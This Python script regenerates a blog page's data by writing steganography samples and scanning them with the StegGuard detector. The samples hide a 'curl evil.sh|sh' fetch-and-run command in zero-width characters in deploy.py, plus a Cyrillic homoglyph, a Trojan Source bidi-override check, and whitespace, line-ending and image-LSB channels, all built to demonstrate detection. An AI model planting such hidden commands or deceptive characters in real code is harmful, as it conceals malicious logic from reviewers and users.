"""Regenerate the /blog page data by running StegGuard on purpose-built samples.

Every file the post talks about is written fresh into a temp folder, scanned
with the real CLI using relative paths (so no local paths leak), and the
output is saved to src/data/blog.json for the page to render.

Run from the site root, against the PyPI release the site documents:

    python3 scripts/build_blog.py [--stegguard PATH_TO_STEGGUARD_EXE]
"""

from __future__ import annotations

import argparse
import json
import math
import os
import random
import re
import struct
import subprocess
import tempfile
import zlib
from datetime import date
from pathlib import Path

SITE = Path(__file__).resolve().parent.parent
LF = "\n"


def zero_width(message: str) -> str:
    """ASCII to zero-width characters: U+200B is 0, U+200C is 1."""
    return "".join("‌" if b == "1" else "​" for c in message.encode() for b in format(c, "08b"))


def write(path: Path, text: str, newline: str = LF) -> None:
    # Bytes, so Windows never rewrites the line endings we put there on purpose.
    path.write_bytes(text.replace(LF, newline).encode("utf-8"))


def make_png(path: Path, pixels: list[int], size: int) -> None:
    raw = b"".join(b"\0" + bytes(pixels[y * size * 3:(y + 1) * size * 3]) for y in range(size))

    def chunk(tag: bytes, data: bytes) -> bytes:
        body = tag + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body))

    header = struct.pack(">IIBBBBB", size, size, 8, 2, 0, 0, 0)
    path.write_bytes(
        b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header) + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")
    )


def write_samples(d: Path) -> None:
    write(d / "deploy.py", 'import os\n\n# Deploy helper.\ndef deploy(env):\n    print("deploying to", env)'
          + zero_width("curl evil.sh|sh") + "\n")

    # The first letter of the last line is Cyrillic U+0430, not Latin "a".
    write(d / "auth.py", 'def is_admin(user):\n    return user == "admin"\n\nаdmin = "x"\n')

    # Trojan Source shape: RLO and isolates around what looks like a comment.
    write(d / "access.py", 'def check(user):\n    access = "user"\n'
          '    if access != "user‮ ⁦# Check if admin⁩ ⁦":\n        print("granted")\n')

    # SNOW style: each trailing space is a 0 bit and each trailing tab a 1 bit, one byte per line.
    notes = ["Release checklist", "Update the changelog", "Tag the build", "Publish to the registry"]
    tail = lambda ch: "".join(" " if b == "0" else "	" for b in format(ch, "08b"))
    body = [line + tail(ch) for line, ch in zip(notes, b"ok!")] + [notes[3]]
    write(d / "notes.txt", LF.join(body) + LF)

    # LF is a 0 bit, CRLF is a 1 bit, one bit per line.
    bits = "".join(format(c, "08b") for c in b"hidden msg!")
    steps = [f"echo step {i}" for i in range(len(bits))]
    (d / "build.sh").write_bytes(b"".join(s.encode() + (b"\r\n" if b == "1" else b"\n") for s, b in zip(steps, bits)))

    write(d / "clean.py", "def add(a, b):\n    return a + b\n")

    # A smooth gradient with light noise, then the same pixels with random bits in every LSB.
    rng = random.Random(7)
    size = 160
    px = []
    for y in range(size):
        for x in range(size):
            px += [int(120 + 80 * math.sin(x / 25)), int(110 + 70 * math.cos(y / 30)), int(90 + x / 3)]
    px = [min(255, max(0, v + rng.choice((0, 0, 0, 1)))) for v in px]
    make_png(d / "photo.png", px, size)
    make_png(d / "vacation.png", [(v & ~1) | rng.getrandbits(1) for v in px], size)


class Runner:
    def __init__(self, exe: str, cwd: Path):
        self.exe, self.cwd = exe, cwd
        self.env = {**os.environ, "PYTHONUTF8": "1", "PYTHONIOENCODING": "utf-8", "NO_COLOR": "1"}

    def run(self, *args: str, ok: tuple[int, ...]) -> str:
        proc = subprocess.run([self.exe, *args], cwd=self.cwd, env=self.env,
                              capture_output=True, text=True, encoding="utf-8")
        if proc.returncode not in ok:
            raise SystemExit(f"stegguard {' '.join(args)} exited {proc.returncode}:\n{proc.stderr}")
        return proc.stdout

    def detect(self, name: str) -> dict:
        out = self.run("detect", name, "--json", "f.json", ok=(0, 1))
        report = json.loads((self.cwd / "f.json").read_text(encoding="utf-8"))
        keep = re.compile(r"^\s*(⚠|ℹ|✓)\s+(?!Clean \(binary)|^\s*• \d|file\(s\)")
        lines = [ln.strip() for ln in out.splitlines() if keep.search(ln)
                 and not any(skip in ln for skip in ("Scanning", "Pillow", "= bit"))]
        result = report["results"][0]
        return {"severity": result["severity"], "lines": lines,
                "exit": 0 if result["severity"] == "clean" else 1}

    def decode(self, name: str) -> dict:
        return json.loads(self.run("decode", name, ok=(0,)))

    def sanitize(self, name: str) -> dict:
        data = json.loads(self.run("sanitize", name, ok=(0,)))
        return {"status": data["sanitization_status"], "changed": data["changed"],
                "output": data["sanitized_path"],
                "changes": {k: v for k, v in data["changes"].items() if v}}


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--stegguard", default="stegguard", help="stegguard executable (the PyPI release)")
    args = parser.parse_args()

    with tempfile.TemporaryDirectory() as tmp:
        work = Path(tmp)
        write_samples(work)
        sg = Runner(args.stegguard, work)
        version = sg.run("--version", ok=(0,)).split()[-1]

        data = {
            "generated": date.today().isoformat(),
            "stegguard_version": version,
            "deploy": {"detect": sg.detect("deploy.py"), "decode": sg.decode("deploy.py")["zero_width"],
                       "sanitize": sg.sanitize("deploy.py")},
            "auth": {"detect": sg.detect("auth.py"), "sanitize": sg.sanitize("auth.py")},
            "access": {"detect": sg.detect("access.py"), "sanitize": sg.sanitize("access.py")},
            "notes": {"detect": sg.detect("notes.txt"), "decode": sg.decode("notes.txt")["trailing_whitespace"],
                      "sanitize": sg.sanitize("notes.txt")},
            "build": {"detect": sg.detect("build.sh"), "decode": sg.decode("build.sh")["line_endings"],
                      "sanitize": sg.sanitize("build.sh")},
            "image": {"stego": sg.detect("vacation.png"), "control": sg.detect("photo.png"),
                      "sanitize": sg.sanitize("vacation.png")},
            "clean": sg.detect("clean.py"),
        }
        # Lines to show verbatim on the page, taken from the generated files.
        data["deploy"]["line"] = (work / "deploy.py").read_text(encoding="utf-8").splitlines()[4]
        data["access"]["line"] = (work / "access.py").read_text(encoding="utf-8").splitlines()[2]

    out = SITE / "src" / "data" / "blog.json"
    out.write_text(json.dumps(data, indent=2, ensure_ascii=True) + "\n", encoding="utf-8")
    print(f"wrote {out.relative_to(SITE)} (stegguard {version})")


if __name__ == "__main__":
    main()
